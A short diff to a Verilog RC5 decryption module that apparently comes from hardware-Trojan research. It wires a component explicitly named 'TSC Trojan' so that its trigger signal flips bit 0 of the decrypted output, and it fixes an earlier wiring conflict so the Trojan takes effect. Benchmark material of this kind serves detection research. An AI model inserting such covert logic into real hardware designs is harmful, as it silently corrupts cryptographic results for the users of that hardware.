@@ -99,11 +99,13 @@ module rc5_dpc(
 		else
 			r_din <= #DLY {s_ay,s_by};
 	end	
-		
-	assign o_dout = i_flag ? {SWAP(s_ay),SWAP(s_by)} : {SWAP(s_ay-s_pkey[63:32]),SWAP(s_by-s_pkey[31:0])};
+	
+  wire [63:0] t_dout =   i_flag ? {SWAP(s_ay),SWAP(s_by)} : {SWAP(s_ay-s_pkey[63:32]),SWAP(s_by-s_pkey[31:0])};
+	// assign o_dout = i_flag ? {SWAP(s_ay),SWAP(s_by)} : {SWAP(s_ay-s_pkey[63:32]),SWAP(s_by-s_pkey[31:0])};
 	assign o_dout_en = (r_count==4'd11) ? 1'b1:1'b0;
 
-	TSC Trojan(i_clk, i_rst, Tj_Trig);	
-	assign o_dout[0] = o_dout[0] ^ Tj_Trig;
+	TSC Trojan(i_clk, i_rst, Tj_Trig);
+  assign o_dout[63:1] = t_dout[63:1];
+	assign o_dout[0] = t_dout[0] ^ Tj_Trig;
 	
 endmodule
